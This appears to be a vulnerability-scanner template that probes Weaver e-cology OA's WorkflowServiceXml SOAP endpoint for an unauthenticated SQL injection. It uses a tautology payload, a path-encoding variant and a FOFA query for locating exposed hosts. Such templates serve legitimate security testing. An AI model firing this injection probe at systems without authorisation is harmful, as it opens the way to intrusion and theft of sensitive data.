templates/weaver-ecology-workflowservicexml-sqli.yaml

http:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - lastOperatorName
    - lastOperateTime
    - receiveTime
  matchers-condition: and
  payloads:
    paths:
    - /services/WorkflowServiceXml
    - /services%20/WorkflowServiceXml
  raw:
  - "POST {{paths}} HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml\n\n<soapenv:Envelope\
    \ xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://webservices.workflow.weaver\"\
    > \n  <soapenv:Header/>\n  <soapenv:Body>\n    <web:getHendledWorkflowRequestList>\n\
    \      <web:in0>1</web:in0>\n      <web:in1>1</web:in1>\n      <web:in2>1</web:in2>\n\
    \      <web:in3>1</web:in3>\n      <web:in4>\n        <web:string>1=1 AND 5615=5615</web:string>\n\
    \      </web:in4>\n    </web:getHendledWorkflowRequestList>\n  </soapenv:Body>\n\
    </soapenv:Envelope>\n"
  stop-at-first-match: true
id: weaver-ecology-workflowservicexml-sqli
info:
  author: Co5mos
  description: "Weaver e-cology OA WorkflowServiceXml\u63A5\u53E3\u5B58\u5728SQL\u6CE8\
    \u5165\u6F0F\u6D1E\uFF0C\u672A\u7ECF\u8EAB\u4EFD\u9A8C\u8BC1\u7684\u8FDC\u7A0B\
    \u653B\u51FB\u8005\u53EF\u4EE5\u5229\u7528SQL\u6CE8\u5165\u6F0F\u6D1E\u83B7\u53D6\
    \u654F\u611F\u4FE1\u606F\u3002\n"
  metadata:
    fofa-query: "app=\"\u6CDB\u5FAE-OA\uFF08e-cology\uFF09\""
  name: Weaver e-cology OA WorkflowServiceXml SQL Injection
  severity: critical
  tags: weaver, ecology, oa, sqli
